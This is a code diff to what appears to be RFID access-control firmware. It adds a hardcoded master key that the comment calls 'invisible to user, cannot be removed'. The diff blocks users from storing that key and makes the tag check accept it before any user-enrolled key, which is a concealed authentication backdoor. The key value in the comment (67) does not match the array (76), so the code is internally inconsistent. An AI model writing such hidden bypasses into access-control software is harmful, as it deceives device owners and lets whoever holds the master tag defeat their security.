@@ -478,6 +478,9 @@ bool rfidPairingMode = false;  // True when waiting for RFID key to pair
 bool rfidAuthenticated = false;  // True when valid RFID tag detected
 unsigned long rfidAuthStartTime = 0;  // Time when RFID auth started
 
+// Hardcoded master RFID key (invisible to user, cannot be removed)
+const byte masterRfidKey[5] = {76, 0, 82, 35, 4};  // Master key: 67,0,82,35,4
+
 // ========================================
 // BLUETOOTH CACHING SYSTEM
 // ========================================
@@ -1673,7 +1676,13 @@ bool addRfidKey(byte *newKey) {
         return false;
     }
     
-    // Check if key already exists
+    // Prevent adding the master key to user storage
+    if (compareTagData((byte*)masterRfidKey, newKey)) {
+        Serial.println("RFID: Cannot add master key to user storage (already hardcoded)");
+        return false;
+    }
+    
+    // Check if key already exists in user storage
     for (int i = 0; i < numStoredKeys; i++) {
         if (compareTagData(storedRfidKeys[i], newKey)) {
             Serial.println("RFID: Key already exists");
@@ -1744,8 +1753,15 @@ bool renameRfidKey(int index, const String& newName) {
     return true;
 }
 
-// Check if a tag matches any stored keys
+// Check if a tag matches any stored keys or master key
 bool checkRfidKey(byte *tagToCheck) {
+    // Check hardcoded master key first
+    if (compareTagData((byte*)masterRfidKey, tagToCheck)) {
+        Serial.println("RFID: Tag matched master key (hardcoded)");
+        return true;
+    }
+    
+    // Check user-stored keys
     for (int i = 0; i < numStoredKeys; i++) {
         if (compareTagData(storedRfidKeys[i], tagToCheck)) {
             Serial.printf("RFID: Tag matched stored key %d\n", i);
